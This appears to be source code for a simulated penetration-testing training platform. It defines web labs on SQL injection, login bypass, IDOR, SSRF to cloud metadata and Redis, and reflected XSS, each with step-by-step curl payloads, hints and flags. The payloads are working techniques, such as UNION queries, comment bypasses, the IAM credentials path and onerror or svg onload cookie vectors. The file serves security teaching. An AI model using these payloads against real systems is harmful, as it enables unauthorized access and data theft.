import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file>>) {
  return {
    hostname: 'kali',
    user: 'root',
    root: dir({ root: dir(extra ?? {}) }),
  };
}

export const webVulnLabs: LabScenario[] = [
  {
    id: 'web-sqli-product',
    title: 'SQL Injection: Product Catalog',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Meridian Retail\'s product page (shop01, 10.10.103.1) builds its SQL query by concatenating the "id" ' +
      'parameter directly into a `SELECT * FROM products WHERE id = <id>` statement, with zero sanitization. ' +
      'This is a classic UNION-based SQL injection: to actually pull data out of an unrelated table you first ' +
      'have to discover how many columns the original query returns (a UNION requires an exact column-count ' +
      'match), then redirect that UNION at a table that was never meant to be reachable from this endpoint.',
    objectives: [
      { text: 'Baseline the endpoint with a normal id: curl "http://10.10.103.1/product?id=1"', why: 'Always record clean, expected behavior first — you need a known-good baseline to recognize when a crafted payload changes the response later, and to prove to a report reviewer that your finding is a real deviation, not normal app behavior.' },
      { text: 'Discover the column count with a UNION probe: curl "http://10.10.103.1/product?id=-1 UNION SELECT 1,2,3--"', why: 'A UNION SELECT only succeeds if it returns the exact number of columns as the original query. Using id=-1 guarantees the original WHERE clause matches nothing, so if your column count is wrong a real target throws a column-count mismatch error — getting the count right is the necessary first step every UNION-based SQLi depends on before any real data can be pulled.' },
      { text: 'Pivot the UNION to the internal secrets table: curl "http://10.10.103.1/product?id=-1 UNION SELECT 1,2,3 FROM secrets--"', why: 'Once you know the query cleanly returns 3 columns, redirecting the SELECT source to a completely unrelated internal table is exactly how UNION-based SQLi dumps data the developer never intended this endpoint to expose.' },
    ],
    hints: [
      'curl "http://10.10.103.1/product?id=1" for a clean baseline.',
      'curl "http://10.10.103.1/product?id=-1 UNION SELECT 1,2,3--" — id=-1 blanks the original result so only injected columns would show; 3 is the right column count here.',
      'curl "http://10.10.103.1/product?id=-1 UNION SELECT 1,2,3 FROM secrets--" — same column count, but sourced from the internal secrets table.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'shop01', ip: '10.10.103.1', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Meridian Retail — Product Catalog</h1><p>Try /product?id=1</p></body></html>' },
          vulnRoutes: [{
            kind: 'sqli', path: '/product', param: 'id',
            triggerSubstrings: ['from secrets'],
            vulnerableResponse: '<html><body><h1>Product Catalog</h1><p>Extra rows returned by the database:</p><p>flag{union_based_sqli_dumps_the_secrets_table}</p></body></html>',
            normalResponse: '<html><body><h1>Product Catalog</h1><p>Product #1: Wireless Mouse — $19.99</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-sqli-login-bypass',
    title: 'SQL Injection: Login Bypass',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'The Ferro Client Portal (portal02, 10.10.103.2) authenticates with a query shaped like ' +
      '`SELECT * FROM users WHERE username=\'<user>\' AND password=\'<pass>\'`. A lone OR-based payload in the ' +
      'username field is NOT enough to bypass this — the trailing `AND password=...` clause still has to ' +
      'evaluate true. You need a comment sequence that erases the rest of the query entirely. Once inside as ' +
      'admin, a debug welcome banner (left on since launch) leaks a shared support SSH credential — chase it to ' +
      'a second host for a harder-won foothold flag.',
    objectives: [
      { text: 'Attempt a normal login and observe the failure: curl -X POST -d "username=admin&password=wrong" http://10.10.103.2/login', why: 'Confirms the login flow and its failure response before you start tampering with it — you need to know what "no" looks like before you can recognize "yes".' },
      { text: `Try a plain OR-based payload with no comment: curl -X POST -d "username=admin' OR '1'='1&password=x" http://10.10.103.2/login`, why: 'This is the payload most tutorials teach first — and it fails here, because the query still ends in `AND password=\'x\'`, which is false. Seeing it fail is the important lesson: OR alone only helps when it is the LAST condition evaluated, not when a real check still follows it.' },
      { text: `Bypass with a trailing comment: curl -X POST -d "username=admin'-- &password=anything" http://10.10.103.2/login`, why: 'The `--` comments out everything after it, including the entire password check — the database only ever evaluates `WHERE username=\'admin\'`. This is the real mechanism behind comment-based SQLi auth bypass, and it is why sanitizing only quotes is never enough.' },
      { text: 'ssh support@10.10.103.102 using the credential leaked in the bypass response', why: 'Debug/welcome banners routinely leak more than intended once you are "inside" — real engagements constantly find that one authentication-bypass finding cascades into full host access because of exactly this kind of leftover diagnostic text.' },
      { text: 'cat user.txt to capture the second flag', why: 'Confirms the leaked credential grants a genuine, standalone shell — turning a single web finding into infrastructure access is the difference between a medium-severity bug report and a full compromise in a real pentest.' },
    ],
    hints: [
      'curl -X POST -d "username=admin&password=wrong" http://10.10.103.2/login',
      `curl -X POST -d "username=admin' OR '1'='1&password=x" http://10.10.103.2/login — watch it still fail.`,
      `curl -X POST -d "username=admin'-- &password=anything" http://10.10.103.2/login`,
      'ssh support@10.10.103.102 — the bypass response reveals the password in an HTML comment.',
      'Once logged in, cat user.txt for the second flag.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'portal02', ip: '10.10.103.2', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Ferro Client Portal — Login</h1><p>POST to /login with username &amp; password</p></body></html>' },
          vulnRoutes: [{
            kind: 'auth-bypass', path: '/login', param: 'username',
            triggerSubstrings: ["'--"],
            vulnerableResponse:
              `<html><body><h1>Welcome, admin</h1><p>Authentication bypassed — the trailing comment stripped the password check entirely.</p><p>flag{sqli_login_bypass_via_comment_injection}</p>\n<!-- DEBUG (remove before prod): shared support SSH account -> support@10.10.103.102, password F3rroSupp0rt!2024 --></body></html>`,
            normalResponse: '<html><body><h1>Login Failed</h1><p>Invalid credentials.</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
      {
        hostname: 'portal02-support', ip: '10.10.103.102', os: 'Ubuntu 20.04',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.2p1' }],
        users: [{ username: 'support', password: 'F3rroSupp0rt!2024' }],
        root: dir({ home: dir({ support: dir({ 'user.txt': file('A leftover debug banner on the web portal leaked this account\'s credentials.\nflag{leaked_debug_banner_credential_to_ssh_foothold}\n') }) }) }),
      } as HostDef,
    ],
  },
  {
    id: 'web-idor-invoice',
    title: 'IDOR: Invoice Viewer',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'You are logged into Ledgerbrook Billing (billing03, 10.10.103.3) as customer 1001. The invoice endpoint ' +
      'trusts the "id" query parameter completely, with no check that the invoice actually belongs to your ' +
      'session — a textbook broken object-level authorization (IDOR/BOLA) flaw. Worse, a leaked invoice also ' +
      'exposes the victim\'s internal account_id, which a second, equally unprotected endpoint uses to return ' +
      'stored payment method details — turning one IDOR into a much more damaging data-exposure chain.',
    objectives: [
      { text: 'View your own invoice: curl "http://10.10.103.3/invoice?id=1001"', why: 'Confirms the response shape for data you are actually authorized to see, so you can recognize when the same request structure returns someone else\'s data.' },
      { text: 'Increment the id to a neighboring invoice: curl "http://10.10.103.3/invoice?id=1002"', why: 'Invoice numbers here are sequential and assigned in creation order — exactly the kind of predictable, enumerable identifier that makes IDOR trivial to exploit at scale (a script could loop through thousands of IDs). This one belongs to another customer entirely.' },
      { text: 'Use the leaked account_id to pull payment details: curl "http://10.10.103.3/payment-method?account_id=ACC-77"', why: 'The invoice IDOR alone already breaks confidentiality, but chaining the account_id it exposes into a second, equally unauthenticated endpoint escalates the impact from "saw someone else\'s invoice total" to "recovered someone else\'s stored payment method" — the difference between a low- and a critical-severity finding in a real report.' },
    ],
    hints: [
      'curl "http://10.10.103.3/invoice?id=1001" — your own invoice.',
      'curl "http://10.10.103.3/invoice?id=1002" — a different, sequential invoice id.',
      'curl "http://10.10.103.3/payment-method?account_id=ACC-77" — the account_id printed on invoice 1002.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'billing03', ip: '10.10.103.3', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Ledgerbrook Billing</h1><p>View your invoice at /invoice?id=1001 (your account)</p></body></html>' },
          vulnRoutes: [
            {
              kind: 'idor', path: '/invoice', param: 'id',
              triggerSubstrings: ['1002'],
              vulnerableResponse: '<html><body><h1>Invoice #1002</h1><p>Customer: J. Whitfield — Total: $4,821.00 — account_id: ACC-77</p><p>flag{idor_invoice_id_leaks_other_customers}</p></body></html>',
              normalResponse: '<html><body><h1>Invoice #1001</h1><p>Customer: You — Total: $89.00 — account_id: ACC-1001</p></body></html>',
            },
            {
              kind: 'idor', path: '/payment-method', param: 'account_id',
              triggerSubstrings: ['acc-77'],
              vulnerableResponse: '<html><body><p>Stored payment method for ACC-77: Visa ending 4471, exp 09/27</p><p>flag{idor_chain_leaks_stored_payment_method}</p></body></html>',
              normalResponse: '<html><body><p>403 Forbidden — no payment method on file for this account.</p></body></html>',
            },
          ],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-idor-profile-api',
    title: 'IDOR: User Profile API',
    difficulty: 'Easy',
    category: 'Web',
    briefing:
      'A mobile app backend for Northgate Social API (api04, 10.10.103.4) exposes user profiles by a raw ' +
      'numeric user_id with no authorization check tying the id to the caller\'s session token. Low, ' +
      'single-digit IDs on systems like this are almost always the earliest-created accounts — which in ' +
      'practice means service and admin accounts created before the first real user ever signed up.',
    objectives: [
      { text: 'Fetch your own profile: curl "http://10.10.103.4/api/user?user_id=42"', why: 'Confirms the JSON shape of a normal, authorized response before you start probing other IDs.' },
      { text: 'Try a plausible neighboring id: curl "http://10.10.103.4/api/user?user_id=41"', why: 'IDOR hunting is rarely a single lucky guess — real testing methodically walks nearby and low-value IDs. This one is a dead end, but it still narrows down what kind of ID range is actually populated.' },
      { text: 'Target the low, likely-admin id: curl "http://10.10.103.4/api/user?user_id=7"', why: 'Single-digit IDs are usually reserved for accounts created when the system first went live — almost always internal service or admin accounts. Finding one confirms the API leaks any account\'s private data to any caller who can guess or enumerate an ID.' },
    ],
    hints: [
      'curl "http://10.10.103.4/api/user?user_id=42" — your own profile.',
      'curl "http://10.10.103.4/api/user?user_id=41" — a nearby id (dead end, but rules it out).',
      'curl "http://10.10.103.4/api/user?user_id=7" — a low id worth targeting.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'api04', ip: '10.10.103.4', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Northgate API</h1><p>GET /api/user?user_id=42 (your profile)</p></body></html>' },
          vulnRoutes: [{
            kind: 'idor', path: '/api/user', param: 'user_id',
            triggerSubstrings: ['7'],
            vulnerableResponse: '{"user_id":7,"name":"Admin Account","email":"admin@northgate.internal","private_notes":"flag{idor_api_user_id_enumeration_leaks_admin}"}',
            normalResponse: '{"user_id":42,"name":"You","email":"you@example.com"}',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-ssrf-fetch',
    title: 'SSRF: URL Fetch Feature',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Brightline Preview Service (proxysvc05, 10.10.103.5) fetches any URL you give it, server-side, to ' +
      'generate a link-preview thumbnail — the same feature class behind several real-world SSRF disclosures. ' +
      'The internal admin panel it can reach is not on the default HTTP port, so a bare loopback guess will not ' +
      'find it — you need the exact host:port the ops team actually bound it to.',
    objectives: [
      { text: 'Confirm the fetch feature works with an external URL: curl "http://10.10.103.5/fetch?url=https://example.com"', why: 'Establishes that the server genuinely performs the fetch server-side (rather than just linkifying text client-side) — that server-side fetch is the entire precondition for SSRF to be possible at all.' },
      { text: 'Probe the loopback address on the default port: curl "http://10.10.103.5/fetch?url=http://127.0.0.1/"', why: 'A reasonable first guess, but it comes back empty — nothing is listening on port 80 on the loopback interface. This rules out the obvious guess and tells you the internal admin service must be on a non-default port, which is realistic: internal tools are rarely bound to :80.' },
      { text: 'Redirect the request to the internal admin panel\'s actual port: curl "http://10.10.103.5/fetch?url=http://127.0.0.1:8080/admin"', why: 'This is the real SSRF payoff: the preview service is trusted by the network perimeter to reach 127.0.0.1, so it happily fetches an admin panel that a direct external request could never touch — turning a "harmless" thumbnail feature into an internal network pivot.' },
    ],
    hints: [
      'curl "http://10.10.103.5/fetch?url=https://example.com"',
      'curl "http://10.10.103.5/fetch?url=http://127.0.0.1/" — nothing on the default port.',
      'curl "http://10.10.103.5/fetch?url=http://127.0.0.1:8080/admin"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'proxysvc05', ip: '10.10.103.5', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Brightline Link Preview</h1><p>GET /fetch?url=https://example.com</p></body></html>' },
          vulnRoutes: [{
            kind: 'ssrf', path: '/fetch', param: 'url',
            triggerSubstrings: ['127.0.0.1:8080'],
            vulnerableResponse: '<html><body><h1>Internal Admin Panel</h1><p>Reachable only from localhost — but the preview service fetched it for us.</p><p>flag{ssrf_link_preview_reaches_internal_admin}</p></body></html>',
            normalResponse: '<html><body><h1>Preview generated for external URL</h1></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-ssrf-metadata',
    title: 'SSRF: Cloud Metadata Leak',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Cascade Webhook Validator (webhook06, 10.10.103.6) runs on cloud infrastructure and will fetch any URL ' +
      'you give it to "validate" it — including the instance metadata service at 169.254.169.254, which every ' +
      'major cloud provider exposes only to the instance itself, with no authentication. Reaching the bare ' +
      'metadata root is not enough; you need the specific IAM security-credentials path that returns temporary ' +
      'access keys. Those stolen credentials then let you pivot into an internal bucket-listing endpoint ' +
      'elsewhere on the same network — exactly the kind of chained cloud compromise behind real incidents like ' +
      'the 2019 Capital One breach.',
    objectives: [
      { text: 'Confirm normal validation behavior: curl "http://10.10.103.6/validate?url=https://example.com/webhook"', why: 'Establishes the expected, benign response shape before you start redirecting the validator at internal targets.' },
      { text: 'Probe the metadata service root: curl "http://10.10.103.6/validate?url=http://169.254.169.254/"', why: 'Confirms the validator can reach the metadata IP at all — but the bare root does not itself hand over credentials, so this alone is not the finding, just proof the SSRF pivot works.' },
      { text: 'Request the IAM security-credentials path: curl "http://10.10.103.6/validate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"', why: 'This is the exact real-world metadata path that returns an instance\'s temporary IAM role credentials — cloud SSRF exploitation almost always targets this specific path, because those short-lived keys grant whatever permissions the instance role itself has.' },
      { text: 'Reuse the leaked token against the internal bucket-listing endpoint: curl -H "X-Security-Token: FwoGZXIvYXdzEXAMPLETOKEN123" "http://10.10.103.6/internal/s3-listing"', why: 'This is the real payoff of metadata theft: the stolen session token is not the finding itself, it is the key to whatever the instance role can access — here, an internal storage bucket listing that should never be reachable without valid, temporary cloud credentials.' },
    ],
    hints: [
      'curl "http://10.10.103.6/validate?url=https://example.com/webhook"',
      'curl "http://10.10.103.6/validate?url=http://169.254.169.254/" — reaches the metadata IP but returns nothing useful yet.',
      'curl "http://10.10.103.6/validate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
      'curl -H "X-Security-Token: FwoGZXIvYXdzEXAMPLETOKEN123" "http://10.10.103.6/internal/s3-listing" — the token is printed in the previous response.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'webhook06', ip: '10.10.103.6', os: 'Ubuntu 22.04 (containerized app, cloud-hosted)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Cascade Webhook Validator</h1><p>GET /validate?url=https://example.com/webhook</p></body></html>' },
          vulnRoutes: [
            {
              kind: 'ssrf', path: '/validate', param: 'url',
              triggerSubstrings: ['iam/security-credentials'],
              vulnerableResponse: '{"AccessKeyId":"AKIA-SIMULATED-EXAMPLE","SecretAccessKey":"REDACTED","Token":"FwoGZXIvYXdzEXAMPLETOKEN123","note":"flag{ssrf_reaches_cloud_metadata_credentials}"}',
              normalResponse: '{"status":"validated","reachable":true}',
            },
            {
              kind: 'ssrf', path: '/internal/s3-listing', param: 'X-Security-Token', location: 'header',
              triggerSubstrings: ['fwogzxivyxdzexampletoken123'],
              vulnerableResponse: '{"bucket":"cascade-internal-artifacts","objects":["deploy-keys.json","customer-export.csv"],"note":"flag{stolen_iam_token_reaches_internal_bucket_listing}"}',
              normalResponse: '{"error":"403 Forbidden - missing security token"}',
            },
          ],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-xss-search',
    title: 'Reflected XSS: Search Page',
    difficulty: 'Easy',
    category: 'Web',
    briefing:
      'The Wraithwood Blog\'s search page (blog07, 10.10.103.7) reflects your query directly into the page. A ' +
      'previous security review flagged raw <script> tags, so a quick regex filter now strips the literal ' +
      'string "<script" before reflecting input — but the underlying problem was never actually fixed: output ' +
      'still is not HTML-encoded, so any other HTML carrying an event handler still executes.',
    objectives: [
      { text: 'Baseline the search endpoint: curl "http://10.10.103.7/search?q=test"', why: 'Confirms how a normal query is reflected before you try to break it.' },
      { text: 'Try the obvious payload: curl "http://10.10.103.7/search?q=<script>alert(1)</script>"', why: 'This is the payload every XSS tutorial starts with — and it does not trigger a confirmed reflection here, telling you the app is filtering the literal "<script" string. The lesson is to try a different vector next, not to conclude the endpoint is safe.' },
      { text: 'Bypass the filter with an event-handler payload: curl "http://10.10.103.7/search?q=<img src=x onerror=alert(document.cookie)>"', why: 'Real filters that block "<script" almost always miss the dozens of other ways to run JavaScript — onerror, onload, javascript: URIs, SVG handlers, and more. This confirms the actual root cause (no output encoding) is still exploitable, regardless of which specific string got blocklisted.' },
    ],
    hints: [
      'curl "http://10.10.103.7/search?q=test"',
      'curl "http://10.10.103.7/search?q=<script>alert(1)</script>" — gets filtered, no confirmed reflection.',
      'curl "http://10.10.103.7/search?q=<img src=x onerror=alert(document.cookie)>"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'blog07', ip: '10.10.103.7', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Wraithwood Blog</h1><p>GET /search?q=your+query</p></body></html>' },
          vulnRoutes: [{
            kind: 'xss', path: '/search', param: 'q',
            triggerSubstrings: ['onerror='],
            vulnerableResponse: '<html><body><h1>Results for: <img src=x onerror=alert(document.cookie)></h1><p>Unencoded reflection confirmed — the &lt;script&gt; filter did nothing to stop this.</p><p>flag{reflected_xss_no_output_encoding}</p></body></html>',
            normalResponse: '<html><body><h1>Results for: test</h1><p>No results found.</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-xss-feedback',
    title: 'Reflected XSS: Feedback Form',
    difficulty: 'Easy',
    category: 'Web',
    briefing:
      'Alderbrook Support\'s feedback confirmation page (support08, 10.10.103.8) echoes your comment back onto ' +
      'the page. Like many real applications, the developers added a quick blocklist for the literal string ' +
      '"<script" after a previous finding, without ever adding actual output encoding — so the fix only closes ' +
      'the one door someone already reported.',
    objectives: [
      { text: 'Baseline the feedback endpoint: curl "http://10.10.103.8/feedback?comment=thanks"', why: 'Confirms the normal echo behavior before probing it.' },
      { text: 'Try the blocked payload: curl "http://10.10.103.8/feedback?comment=<script>alert(document.cookie)</script>"', why: 'Confirms the blocklist exists — the literal <script> tag does not trigger a confirmed reflection, which could mislead an inexperienced tester into (incorrectly) closing this as fixed.' },
      { text: 'Bypass it with an SVG handler: curl "http://10.10.103.8/feedback?comment=<svg onload=alert(document.cookie)>"', why: 'SVG\'s onload handler fires the moment the element renders and is rarely covered by a "<script" blocklist — this confirms the real root cause (no output encoding) is still exploitable and that the earlier fix was cosmetic, not structural.' },
    ],
    hints: [
      'curl "http://10.10.103.8/feedback?comment=thanks"',
      'curl "http://10.10.103.8/feedback?comment=<script>alert(document.cookie)</script>" — blocked.',
      'curl "http://10.10.103.8/feedback?comment=<svg onload=alert(document.cookie)>"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'support08', ip: '10.10.103.8', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Alderbrook Support</h1><p>GET /feedback?comment=your+comment</p></body></html>' },
          vulnRoutes: [{
            kind: 'xss', path: '/feedback', param: 'comment',
            triggerSubstrings: ['onload='],
            vulnerableResponse: '<html><body><h1>Thanks for your feedback:</h1><p><svg onload=alert(document.cookie)></p><p>flag{reflected_xss_feedback_form_unencoded}</p></body></html>',
            normalResponse: '<html><body><h1>Thanks for your feedback:</h1><p>thanks</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-idor-coupon',
    title: 'IDOR: Gift Card Balance API',
    difficulty: 'Easy',
    category: 'Web',
    briefing:
      'Palisade Rewards\' gift card balance checker (giftcards09, 10.10.103.9) returns the balance for ANY code ' +
      'supplied, with no ownership check and no rate limiting — a business-logic flaw as much as an access ' +
      'control one. Palisade\'s internal codes follow a visible naming convention (a numeric block plus a role ' +
      'suffix), which is exactly the kind of pattern real attackers look for once they spot one example.',
    objectives: [
      { text: 'Check your own gift card balance: curl "http://10.10.103.9/giftcard?code=GC-1000-YOUR"', why: 'Confirms the endpoint\'s response shape for a code you actually own.' },
      { text: 'Try a plausible neighboring code: curl "http://10.10.103.9/giftcard?code=GC-1001-USER"', why: 'Tests the obvious next guess in the numbering sequence — it does not exist, but it still narrows down the real naming convention (a role suffix, not just a sequential number).' },
      { text: 'Target the admin-suffixed code: curl "http://10.10.103.9/giftcard?code=GC-1001-ADMIN"', why: 'Once you notice the suffix looks like a role tag rather than a random string, guessing "ADMIN" for a privileged, high-balance code is exactly the kind of pattern-based enumeration real attackers use against predictable business identifiers — and it has no rate limiting to stop you.' },
    ],
    hints: [
      'curl "http://10.10.103.9/giftcard?code=GC-1000-YOUR"',
      'curl "http://10.10.103.9/giftcard?code=GC-1001-USER" — dead end, but shows the code format.',
      'curl "http://10.10.103.9/giftcard?code=GC-1001-ADMIN"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'giftcards09', ip: '10.10.103.9', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Palisade Rewards</h1><p>GET /giftcard?code=GC-1000-YOUR</p></body></html>' },
          vulnRoutes: [{
            kind: 'idor', path: '/giftcard', param: 'code',
            triggerSubstrings: ['gc-1001-admin'],
            vulnerableResponse: '<html><body><p>Card GC-1001-ADMIN balance: $9,500.00</p><p>flag{giftcard_code_enumeration_no_rate_limit}</p></body></html>',
            normalResponse: '<html><body><p>Card GC-1000-YOUR balance: $25.00</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-sqli-search-filter',
    title: 'SQL Injection: Employee Directory',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Corbin HR Systems\' internal employee directory (hrportal10, 10.10.103.10) filters by department using ' +
      'unsanitized string concatenation. As with any UNION-based injection, you have to match the original ' +
      'query\'s column count before you can pivot the SELECT to an unrelated table — here, an internal ' +
      'compensation table (comp_data) that should never be reachable from a public directory search.',
    objectives: [
      { text: 'Baseline the directory: curl "http://10.10.103.10/employees?dept=sales"', why: 'Confirms normal filtering behavior before injecting anything.' },
      { text: `Probe the column count: curl "http://10.10.103.10/employees?dept=sales' UNION SELECT 1,2--"`, why: 'A guess of 2 columns — against a real target, a wrong column count throws a database error instead of a clean page. Confirming the count manually like this (rather than guessing blindly at the final payload) is exactly how UNION-based testing works in practice.' },
      { text: `Pivot to the compensation table: curl "http://10.10.103.10/employees?dept=sales' UNION SELECT name,salary FROM comp_data--"`, why: 'With the column count confirmed, redirecting the SELECT source to comp_data pulls salary records that have nothing to do with the department directory — a clean demonstration of how UNION-based SQLi crosses trust boundaries between unrelated tables in the same database.' },
    ],
    hints: [
      'curl "http://10.10.103.10/employees?dept=sales"',
      `curl "http://10.10.103.10/employees?dept=sales' UNION SELECT 1,2--" — confirms a 2-column layout.`,
      `curl "http://10.10.103.10/employees?dept=sales' UNION SELECT name,salary FROM comp_data--"`,
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'hrportal10', ip: '10.10.103.10', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Corbin HR Directory</h1><p>GET /employees?dept=sales</p></body></html>' },
          vulnRoutes: [{
            kind: 'sqli', path: '/employees', param: 'dept',
            triggerSubstrings: ['from comp_data'],
            vulnerableResponse: '<html><body><h1>Employee Directory</h1><p>Leaked from comp_data: CEO salary record</p><p>flag{sqli_union_leaks_unrelated_salary_table}</p></body></html>',
            normalResponse: '<html><body><h1>Employee Directory</h1><p>3 employees in Sales</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-auth-bypass-admin',
    title: 'Auth Bypass: Admin Panel Login',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Stonegate Admin Console\'s login (adminpanel11, 10.10.103.11) shares the same vulnerable query-building ' +
      'code as many legacy internal tools: `SELECT * FROM admins WHERE username=\'<user>\' AND password=\'<pass>\'`. ' +
      'As with any auth bypass built on this shape of query, a bare OR condition in the username is not enough ' +
      '— the trailing password check still has to be neutralized with a comment.',
    objectives: [
      { text: 'Attempt a normal login and observe the failure: curl -X POST -d "username=admin&password=wrong" http://10.10.103.11/admin/login', why: 'Confirms the baseline failure response for invalid credentials.' },
      { text: `Try a bare OR payload: curl -X POST -d "username=admin' OR '1'='1&password=x" http://10.10.103.11/admin/login`, why: 'This fails for the same reason it would on any query shaped this way — the trailing `AND password=\'x\'` clause is still evaluated and is false. It is a common mistake to assume any OR injection works; seeing it fail here reinforces why the comment technique matters.' },
      { text: `Bypass with a trailing comment: curl -X POST -d "username=admin'-- &password=x" http://10.10.103.11/admin/login`, why: 'The comment erases the rest of the query, including the password check entirely — granting full administrative access with zero valid credentials, exactly the maximum-impact outcome auth-bypass findings are rated for.' },
    ],
    hints: [
      'curl -X POST -d "username=admin&password=wrong" http://10.10.103.11/admin/login',
      `curl -X POST -d "username=admin' OR '1'='1&password=x" http://10.10.103.11/admin/login — still fails.`,
      `curl -X POST -d "username=admin'-- &password=x" http://10.10.103.11/admin/login`,
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'adminpanel11', ip: '10.10.103.11', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Stonegate Admin Console</h1><p>POST to /admin/login</p></body></html>' },
          vulnRoutes: [{
            kind: 'auth-bypass', path: '/admin/login', param: 'username',
            triggerSubstrings: ["'--"],
            vulnerableResponse: '<html><body><h1>Admin Dashboard</h1><p>Full administrative access granted.</p><p>flag{admin_console_sqli_auth_bypass}</p></body></html>',
            normalResponse: '<html><body><h1>Login Failed</h1></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'web-ssrf-image-proxy',
    title: 'SSRF: Image Proxy Service',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Harborlight Media CDN\'s image resizing proxy (imgproxy12, 10.10.103.12) fetches whatever URL you give ' +
      'it server-side before resizing. A bare "localhost" guess on the default port finds nothing — the ' +
      'internal service it can actually reach is an in-memory cache bound to a non-standard port, the same ' +
      'kind of internal service SSRF is most often used to reach in real cloud deployments.',
    objectives: [
      { text: 'Confirm the proxy works with an external image URL: curl "http://10.10.103.12/proxy?src=https://example.com/image.png"', why: 'Confirms server-side fetching genuinely happens — the precondition for any SSRF.' },
      { text: 'Probe localhost on the default port: curl "http://10.10.103.12/proxy?src=http://localhost/"', why: 'A reasonable first guess, but nothing is listening on port 80 locally — internal-only services are almost never bound to the default web port, which is exactly why this comes back empty.' },
      { text: 'Redirect to the internal cache service\'s real port: curl "http://10.10.103.12/proxy?src=http://localhost:6379/"', why: 'Port 6379 is the well-known default for Redis — a service that should never be reachable from outside the host. This confirms the proxy can pivot into internal-only infrastructure, exactly the impact SSRF findings are prized for in bug bounty programs.' },
    ],
    hints: [
      'curl "http://10.10.103.12/proxy?src=https://example.com/image.png"',
      'curl "http://10.10.103.12/proxy?src=http://localhost/" — nothing on the default port.',
      'curl "http://10.10.103.12/proxy?src=http://localhost:6379/"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'imgproxy12', ip: '10.10.103.12', os: 'Ubuntu 22.04 (containerized app)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0 (reverse proxy)',
          http: { '/': '<html><body><h1>Harborlight Image Proxy</h1><p>GET /proxy?src=https://example.com/image.png</p></body></html>' },
          vulnRoutes: [{
            kind: 'ssrf', path: '/proxy', param: 'src',
            triggerSubstrings: ['localhost:6379'],
            vulnerableResponse: '<html><body><p>Internal service response captured via proxy:</p><p>flag{image_proxy_ssrf_reaches_internal_services}</p></body></html>',
            normalResponse: '<html><body><p>[resized image placeholder]</p></body></html>',
          }],
        }],
